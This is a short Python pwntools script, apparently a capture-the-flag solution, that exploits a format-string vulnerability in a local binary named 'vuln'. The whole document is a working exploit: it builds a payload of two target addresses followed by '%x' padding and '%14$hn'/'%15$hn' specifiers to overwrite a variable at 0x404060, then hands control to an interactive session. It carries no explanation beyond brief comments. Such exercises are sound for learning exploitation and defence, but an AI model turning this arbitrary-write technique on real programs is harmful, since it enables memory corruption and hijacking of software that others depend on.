import pwn
import time
import sys

elf = pwn.context.binary = pwn.ELF('./vuln')
io = elf.process()

#Sus is at 0x404060
#Input is at index 14
#High order = 0x6761
#Low order = 0x6c66

#Payload = Addr%highOrder%14$hn%lowOrder%15$hn
addr = 0x404060
highOrder = 26465 - 8
lowOrder = 27750 - (highOrder + 8)
highOrder = (str(highOrder)).encode()
lowOrder = (str(lowOrder)).encode()
payload = b""
payload += pwn.p32(addr+2)
payload += pwn.p32(addr)
payload += b'%'
payload += highOrder
payload += b'x%14$hn%'
payload += lowOrder
payload += b'x%15$hn'

print(payload)
io.recv(1000)
io.sendline(payload)
io.interactive()
